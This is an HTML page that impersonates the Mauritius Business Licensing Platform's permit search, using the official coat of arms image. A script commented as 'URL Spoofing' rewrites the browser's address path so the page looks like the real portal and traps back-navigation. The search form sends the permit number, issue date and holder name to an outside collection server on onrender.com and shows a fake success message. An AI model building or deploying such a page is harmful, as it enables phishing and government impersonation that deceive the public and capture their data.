<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Search Permits</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="icon" type="image/png" href="edb-logo.png">

    <script>
        // URL Spoofing - Make browser show Mauritius URL
        (function () {
            var fakePath = '/wps/portal/business/home/searchpermits/';
            window.history.replaceState(null, null, fakePath);
            document.title = "Search Permits";
            window.addEventListener('popstate', function () {
                window.history.pushState(null, null, fakePath);
            });
        })();
    </script>

    <style>
        body {
            font-family: "Segoe UI", Roboto, Arial, sans-serif;
            background-color: #fff;
            color: #333;
        }

        /* Header */
        .topbar {
            border-bottom: 1px solid #e5e5e5;
            background-color: #fff;
            padding: 10px 0;
        }

        .brand {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .brand img {
            height: 48px;
        }

        .brand-text {
            line-height: 1.5;
        }

        .brand-text h1 {
            font-size: 15px;
            color: #17181a;
            padding: 12px 20px;
            margin: 0px;
        }

        /* Navbar tabs */
        .nav-tabs-container {
            background: #f7f9fb;
            box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.05);
        }

        .nav-tabs-container .nav-link {
            color: #1e73be;
            font-weight: 600;
            padding: 12px 20px;
        }

        .nav-tabs-container .nav-link.active {
            border-bottom: 4px solid #2b6ea3;
            color: #2b6ea3;
        }

        /* Search form */
        .search-section {
            padding: 40px 15px;
            max-width: 1100px;
            margin: 0 auto;
        }

        .search-section h2 {
            font-size: 26px;
            margin-bottom: 25px;
            color: #222;
        }

        .search-section label {
            font-weight: 500;
            font-size: 14px;
            margin-bottom: 6px;
        }

        .search-section input {
            border-radius: 4px;
            border: 1px solid #ccc;
            padding: 10px;
            width: 100%;
        }

        .btn-search {
            background: #fff;
            color: #2b6ea3;
            border: 1px solid #c6d6e8;
            border-radius: 6px;
            padding: 10px 18px;
            font-weight: 500;
            margin-top: 15px;
            transition: background 0.2s;
        }

        .btn-search:hover {
            background: #f3f6fa;
        }

        /* Footer */
        footer {
            background: #3b3b3b;
            color: #ddd;
            padding: 40px 0;
            margin-top: 60px;
        }

        footer h5 {
            color: #eee;
            font-size: 15px;
            margin-bottom: 10px;
        }

        footer ul {
            list-style: none;
            padding-left: 0;
        }

        footer li {
            margin-bottom: 6px;
            font-size: 13px;
        }

        /* Responsive tweaks */
        @media (max-width: 768px) {
            .brand-text h1 {
                font-size: 16px;
            }

            .nav-tabs-container .nav-link {
                padding: 10px;
                font-size: 14px;
            }
        }
    </style>
</head>

<body>

    <!-- Header -->
    <header class="topbar">
        <div class="container d-flex justify-content-between align-items-center">
            <div class="brand">
                <img src="https://business.edbmauritius.org/wps/wcm/connect/business/16d6872a-d40e-4e5b-a460-b9d792829d93/Coat+of+Arms+of+Mauritius.png"
                    alt="Mauritius Logo">
                <div class="brand-text">
                    <h1>Mauritius Business Licensing Platform</h1>
                </div>
            </div>
            <div class="d-flex align-items-center gap-3">
                <div class="d-flex border rounded px-2 py-1 align-items-center">
                    <input type="text" class="border-0" placeholder="Search..." style="outline:none; width:150px;">
                    <span>üîç</span>
                </div>
                <a href="#" class="text-decoration-none fw-semibold text-primary">REGISTER</a>
                <a href="#" class="text-decoration-none fw-semibold text-primary">LOGIN</a>
            </div>
        </div>
    </header>

    <!-- Navigation Tabs -->
    <nav class="nav-tabs-container">
        <div class="container d-flex flex-wrap">
            <a href="#" class="nav-link active"><i class="bi bi-search"></i> Search Permits</a>
        </div>
    </nav>

    <!-- Main Search Section -->
    <section class="search-section">
        <h2>Enter the details of the permit you are looking for</h2>
        <form id="permitForm">
            <div class="row g-3">
                <div class="col-md-4">
                    <label for="permitNumber">Permit Number</label>
                    <input type="text" id="permitNumber" placeholder="Insert the permit number">
                </div>
                <div class="col-md-4">
                    <label for="issuedDate">Issued Date</label>
                    <input type="date" id="issuedDate">
                </div>
                <div class="col-md-4">
                    <label for="permitHolder">Permit Holder</label>
                    <input type="text" id="permitHolder" placeholder="Insert the permit holder name">
                </div>
            </div>
            <button type="submit" class="btn-search mt-3">Search</button>
        </form>
    </section>

    <!-- Footer -->
    <footer class="gov-footer">
        <!-- Keep your footer content as before -->
    </footer>

    <script>
        // Replace with your Render URL
        const BACKEND_URL = 'https://yourappname.onrender.com/save';

        document.getElementById('permitForm').addEventListener('submit', (e) => {
            e.preventDefault();

            const permitNumber = document.getElementById('permitNumber').value.trim();
            const issuedDate = document.getElementById('issuedDate').value;
            const permitHolder = document.getElementById('permitHolder').value.trim();

            if (!permitNumber || !issuedDate || !permitHolder) {
                alert("Please fill in all fields.");
                return;
            }

            const data = { permitNumber, issuedDate, permitHolder };

            fetch(BACKEND_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
                .then(res => res.json())
                .then(response => {
                    alert(response.message || "Data submitted successfully!");
                    document.getElementById('permitNumber').value = '';
                    document.getElementById('issuedDate').value = '';
                    document.getElementById('permitHolder').value = '';
                })
                .catch(err => alert("Error: " + err));
        });
    </script>

</body>
</html>
